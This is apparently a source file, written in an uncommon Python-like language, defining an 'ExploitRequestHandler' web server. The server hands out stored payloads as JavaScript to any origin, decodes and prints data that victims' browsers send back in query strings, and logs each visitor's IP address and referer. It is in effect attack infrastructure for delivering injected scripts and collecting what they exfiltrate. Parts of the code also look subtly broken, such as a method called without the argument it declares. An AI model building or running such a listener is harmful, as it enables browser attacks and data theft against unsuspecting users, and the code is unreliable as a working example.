from('urlparse', 'urlparse', 'parse_qs');
from('BaseHTTPServer', 'BaseHTTPRequestHandler');

class BaseHTTPRequestHandler ExploitRequestHandler {
    do_GET: @{
        uri = urlparse(self.path);
        rsrc = self.getFile(uri.path);
        query = parse_qs(uri.query);
        
        print('Path: %s' % self.path);
        print('Resource: %s' % rsrc);
        print('Referer: %s' % self.getReferer());
        print('IP: {}:{}'.format(self.getIP(), self.getPort()));    
        hasContent = rsrc != null && rsrc != '';
        
        if (query != null && query != '') {
            self.handleQuery();
        } else if(hasContent) {
            self.handleResource();
        }       
        
        code = uri.query != '' || hasContent ? 200 : 404;
        self.send_response(code);
        self.send_header('Access-Control-Allow-Origin', '*');
        self.end_headers();
        
        if (hasContent) self.wfile.write(rsrc);
    },
    
    handleQuery: @{
        self.getMsg() |> print;
    },
    
    handleResource: @(rsrc) {
        self.send_header('Content-type', 'text/javascript');
    },
    
    getIP: @() self.client_address[0],
    getPort: @() self.client_address[1],
    getUrl: @() urlparse(self.path),
    getQuery: @() self.getUrl().query |> parse_qs,
    
    getMsg: @() {
        q = self.getQuery();        
        keys = q.keys();
        
        ret len(keys) != 0 ? ExploitEncoding.decode(q[keys[0]][0]) : null;
    },
    
    getReferer: @()
        self.headers.getheaders('referer') 
            @(r) len(r) != 0 ? r[0] : null,
    
    getFile: @(path) {
        if (len(path) == 0) ret null;        
        name = path[__emit('1:')];        
        text = self.server.payloads.get(name);        
        ret text;
    },
};